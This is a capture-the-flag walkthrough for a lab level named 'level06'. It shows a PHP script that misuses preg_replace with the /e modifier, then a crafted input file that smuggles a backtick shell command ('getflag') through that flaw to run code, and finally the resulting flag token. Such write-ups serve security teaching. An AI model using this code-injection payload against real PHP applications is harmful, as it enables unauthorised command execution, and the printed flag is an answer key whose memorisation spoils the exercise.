
# Resources for level06

## Walkthrough to capture the flag:

### Step 1: Inspect the PHP script
```bash
cat level06.php
```
> Output:
```php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) {
  $a = file_get_contents($y);
  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
  $a = preg_replace("/\[/", "(", $a);
  $a = preg_replace("/\]/", ")", $a);
  return $a;
}
$r = x($argv[1], $argv[2]); print $r;
?>
```
> This PHP script evaluates specially crafted input files using a vulnerable `preg_replace` with the `/e` modifier (which executes code).

---

### Step 2: Create a malicious input file
```bash
echo '[x ${`getflag`} ]' > /tmp/getflag
```
> This input will trigger code execution. `${\`getflag\`}` is evaluated in the shell, and the flag will be printed.

---

### Step 3: Verify the file content
```bash
cat /tmp/getflag
```
> Confirm the file has the correct malicious payload.

---

### Step 4: Execute the vulnerable PHP script
```bash
./level06 /tmp/getflag
```
> The script reads `/tmp/getflag`, evaluates its content, and executes `getflag`.

---

### Final Flag
```
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```
